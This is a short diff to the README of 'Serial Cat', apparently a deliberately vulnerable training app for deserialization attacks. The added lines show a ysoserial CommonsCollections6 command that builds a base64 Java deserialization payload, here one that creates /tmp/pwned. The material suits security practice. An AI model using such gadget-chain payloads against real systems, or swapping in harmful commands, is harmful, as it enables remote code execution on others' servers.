@@ -2,4 +2,6 @@ Serial Cat is a little application that allows deserialization attacks including
 
 Deploy at your own risk.
 
-Use with ysoserial CommonCollections6 : https://github.com/frohoff/ysoserial
+Use with ysoserial : https://github.com/frohoff/ysoserial
+The following payload should generate a file in /tmp in linux.
+java -jar ysoserial-master.jar CommonsCollections6 "touch /tmp/pwned"|base64
